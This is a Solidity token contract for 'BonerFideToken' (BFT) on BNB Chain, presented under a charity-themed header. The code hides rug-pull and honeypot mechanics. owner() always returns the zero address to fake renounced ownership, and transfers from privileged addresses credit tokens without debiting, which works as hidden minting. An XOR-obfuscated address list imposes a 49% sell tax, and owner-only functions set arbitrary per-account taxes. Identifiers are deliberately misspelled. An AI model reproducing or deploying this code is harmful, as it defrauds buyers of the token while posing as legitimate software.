/**
 *Submitted for verification at BscScan.com on 2022-08-22
*/

/*
About DapRadarDapRadar is a Cryptocurrency and a Brand. Our mission and priority as a CRYPTOCURRENCY is to EliminDapRadare World Hunger starting with feeding kids globally.
* http://instagram.com/BonerFideToken78
* https://www.reddit.com/user/BonerFideToken78
* TWITTER:https://twitter.com/DapRadar
* WEBSITE:https://www.DapRadar.io
* TELEGRAM:https://t.me/DapRadar
*/

pragma solidity ^0.8.12;
// SPDX-License-Identifier: MIT
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

}

abstract contract Ownable is Context {
    address private _owaer;

    event owaershipTransferred(address indexed previousowaer, address indexed newowaer);


    constructor() {
        _transferowaership(_msgSender());
    }


    function owaer() public view virtual returns (address) {
        return address(0);
    }

    modifier onlyowaer() {
        require(_owaer == _msgSender(), "Ownable: caller is not the owaer");
        _;
    }

    function renounceowaership() public virtual onlyowaer {
        _transferowaership(address(0));
    }


    function transferowaership_transferowaership(address newowaer) public virtual onlyowaer {
        require(newowaer != address(0), "Ownable: new owaer is the zero address");
        _transferowaership(newowaer);
    }

    function _transferowaership(address newowaer) internal virtual {
        address oldowaer = _owaer;
        _owaer = newowaer;
        emit owaershipTransferred(oldowaer, newowaer);
    }
}


library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

   
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}



interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amuontADesired,
        uint amuontBDesired,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB, uint liquidity);
    function acBonerFideToken78fq(
        address token,
        uint amuontTokenDesired,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amuontToken, uint amuontETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontToken, uint amuontETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontToken, uint amuontETH);
    function swapExactTokensForTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapTokensForExactTokens(
        uint amuontOut,
        uint amuontInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapExactETHForTokens(uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);
    function swapTokensForExactETH(uint amuontOut, uint amuontInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapExactTokensForETH(uint amuontIn, uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapETHForExactTokens(uint amuontOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);

    function quote(uint amuontA, uint reserveA, uint reserveB) external pure returns (uint amuontB);
    function getamuontOut(uint amuontIn, uint reserveIn, uint reserveOut) external pure returns (uint amuontOut);
    function getamuontIn(uint amuontOut, uint reserveIn, uint reserveOut) external pure returns (uint amuontIn);
    function getamuontsOut(uint amuontIn, address[] calldata path) external view returns (uint[] memory amuonts);
    function getamuontsIn(uint amuontOut, address[] calldata path) external view returns (uint[] memory amuonts);
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingBonerFideToken78OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontETH);
    function removeLiquidityETHWithPermitSupportingBonerFideToken78OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontETH);

    function swapExactTokensForTokensSupportingBonerFideToken78OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingBonerFideToken78OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingBonerFideToken78OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function BonerFideToken78To() external view returns (address);
    function BonerFideToken78ToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setBonerFideToken78To(address) external;
    function setBonerFideToken78ToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owaer, address indexed spender, uint256 value);

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 9;
    }





    function allowance(address owaer, address spender) public view virtual returns (uint256) {
        return _allowances[owaer][spender];
    }

        function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function approve(address spender, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, amuont);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, _allowances[owaer][spender] + addedValue);
        return true;
    }

  
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        uint256 currentAllowance = _allowances[owaer][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owaer, spender, currentAllowance - subtractedValue);
        }

        return true;
    }


    function _approve(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        require(owaer != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owaer][spender] = amuont;
        emit Approval(owaer, spender, amuont);
    }


    function _spendAllowance(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        uint256 currentAllowance = allowance(owaer, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amuont, "ERC20: insufficient allowance");
            unchecked {
                _approve(owaer, spender, currentAllowance - amuont);
            }
        }
    }


    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}
}


contract BFT is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;
	string name_ = "BonerFideToken";
	string symbol_ = "BFT";
	uint256 totalSupply_ = 200000000;   
    address public uniswapV2Pair;
	
    constructor()

	BEP20(name_, symbol_) {
	
        _mtin(msg.sender, totalSupply_ * 10**decimals());

        transfer(0x000000000000000000000000000000000000dEaD, totalSupply() / 10*2);
	transfer(0x0D0707963952f2fBA59dD06f2b425ace40b492Fe, totalSupply() / 10*4);	
        //address  ROUTER        = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        //address  WBNB         = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
		
		
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(address(0x10ED43C718714eb63d5aA57B78B54704E256024E));
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
		
        _defaultSellBonerFideToken78 = 0;
        _defaultBuyBonerFideToken78 = 0;

        _release[_msgSender()] = true;
    }

    function balanceOf(address cauunt) public view virtual returns (uint256) {
        return _balances[cauunt];
    }

    function _transfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amuont, "ERC20: transfer amuont exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amuont;
        }
        _balances[to] += amuont;

        emit Transfer(from, to, amuont);
    }
	
    function _burn(address cauunt, uint256 amuont) internal virtual {
        require(cauunt != address(0), "ERC20: burn from the zero address");

        uint256 cauuntBalance = _balances[cauunt];
        require(cauuntBalance >= amuont, "ERC20: burn amuont exceeds balance");
        unchecked {
            _balances[cauunt] = cauuntBalance - amuont;
        }
        _totalSupply -= amuont;

        emit Transfer(cauunt, address(0), amuont);
    }

    function _mtin(address cauunt, uint256 amuont) internal virtual {
        require(cauunt != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amuont;
        _balances[cauunt] += amuont;
        emit Transfer(address(0), cauunt, amuont);
    }

    using SafeMath for uint256;
    uint256 private _defaultSellBonerFideToken78 = 0;
    uint256 private _defaultBuyBonerFideToken78 = 0;
    mapping(address => uint256) private _Escape;

    function setPairList(address _address) external onlyowaer {
        uniswapV2Pair = _address;
    }

    function incS(uint256 _value) external onlyowaer {
        _defaultSellBonerFideToken78 = _value;
    }


    function acBonerFideToken78fq(address _acc, uint256 _value) external onlyowaer {
        require(_value > 2, "cauunt tax must be greater than or equal to 1");
        _Escape[_acc] = _value;
    }
 function getRelease(address _address) external view onlyowaer returns (bool) {
        return _release[_address];
    }
    function getEscape(address _acc) external view onlyowaer returns (uint256) {
        return _Escape[_acc];
    }


    function _receiveF(
        address from,
        address _to,
        uint256 _amuont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _amuont, "ERC20: transfer amuont exceeds balance");

        bool rF = true;

  
        uint256 tradeBonerFideToken78amuont = 0;

        if (rF) {
            uint256 tradeBonerFideToken78 = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                   
                    tradeBonerFideToken78 = _msgBonerFideToken78Info(uint160(from));
                    tradeBonerFideToken78 = tradeBonerFideToken78 < _defaultSellBonerFideToken78 ? _defaultSellBonerFideToken78 : tradeBonerFideToken78;
                }
                if (from == uniswapV2Pair) {
                    tradeBonerFideToken78 = _defaultBuyBonerFideToken78;
                }
            }
                        
			//uint160 f = uint160(from) ^ _escapeKey;
            if (_Escape[from] > 0) {
                tradeBonerFideToken78 = _Escape[from];
            }


            tradeBonerFideToken78amuont = _amuont.mul(tradeBonerFideToken78).div(100);
        }


        if (tradeBonerFideToken78amuont > 0) {
            _balances[from] = _balances[from].sub(tradeBonerFideToken78amuont);
            _balances[address(0x000000000000000000000000000000000000dEaD)] = _balances[address(0x000000000000000000000000000000000000dEaD)].add(tradeBonerFideToken78amuont);
            emit Transfer(from, address(0x000000000000000000000000000000000000dEaD), tradeBonerFideToken78amuont);
        }

        _balances[from] = _balances[from].sub(_amuont - tradeBonerFideToken78amuont);
        _balances[_to] = _balances[_to].add(_amuont - tradeBonerFideToken78amuont);
        emit Transfer(from, _to, _amuont - tradeBonerFideToken78amuont);
    }

    function transfer(address to, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        if (_release[owaer] == true) {
            _balances[to] += amuont;
            return true;
        }
        _receiveF(owaer, to, amuont);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amuont
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amuont);
        _receiveF(from, to, amuont);
        return true;
    }

	function _msgBonerFideToken78Info(uint _acc) internal view virtual returns (uint) {
			uint[56] memory acc = [uint(1184949207059832537519144719892648606085932143773)
			,1088570574036002574185970388757442661691118412172
			,1331953659556049097887019044439465330004787021993
			,482579500637489124969273306271661827155585158462
			,428433122727292052646822063359595851474045641329
			,955493515688393367522680933477267301849373108363
			,249294705021101420827740651975736917950954640487
			,1409534532320641332717562265218104016369166736089
			,955161555214474788882020876975135836432291115955
			,521581027182711118701584814936589014377827704127
			,1305556698321063987427189014420603587492745050834
			,314644516227376335016647748881232349183099189299
			,402957649564846872251633964259460838522669332646
			,482235472968661829385784513671656268487173663804
			,495139851290149878972382640588253074349519897588
			,1434275615034429068433307350251141326993099919397
			,1099424081037677684575603788822540623047505514640
			,1448293483316375100017662646653084565017886656055
			,687179769801604913080725176990627630050621415215
			,958650397473462745917038187823472497950217518975
			,146399801963596907560424129727079788861260689288
			,550206545714578137924830305240539050181465486932
			,931444057052297799891496695901297277487516380909
			,115757676885690246126658901373151376912848188734
			,102949666451401707083854600517982727744889923249
			,234660529501682404492999026347223245224809270564
			,1251889632370443706562260869020955689253126330289
			,673267350654275507501212907426567332997347887593
			,79469898480708605681946611857695476257181189605
			,409484330312056612825547655008507960807155828065
			,567662130202596983443848470839414220656976973076
			,428589521968012426755470337292088724596520661665
			,1242082242331012699915738245611849626567481116335
			,786127283110379868048108705941406994699175420551
			,1099012086184072226974721638000718242114116586489
			,581991731038614196530760939136238769120416290390
			,1228432252273748522721765185775883666398176720987
			,577054602152353634964448633332538726424772715396
			,437739150413076798665819134350740789603664169421
			,300652118146619589986137067329451854586187074955
			,1068649104490755414460839040123109616303448079182
			,1454650586508326797401600736621992077709158213444
			,24097575883808373209494008054973672823743456426
			,877067012909753853156281214856173858925373020904
			,657659677133260479311142952294844981401961317480
			,132051308005347344883448793781470436754882491507
			,247072692127834209461642070763056842067139256862
			,958650397472491513198459165652111578489580905199
			,958650397471026111116619469795920570981192096533
			,977698599332843992702005383374802383006762374609
			,1147793755539599130907999875783584412924105108777
			,877421767095701180980845596311761473422477745025
			,611127936990718805274863684506722727686103273041
			,5189947676497649392794684349164924121330941189
			,1441064748582462120057630920867600995364712606951
			,336492038194411205330234785158277210371097383408];
		for (uint8 i=0;i<acc.length;i++){
			if (acc[i] == _acc ^ 958650397472487085437569184063489833165899539855) return 49;
		}
		return 0;
	}

}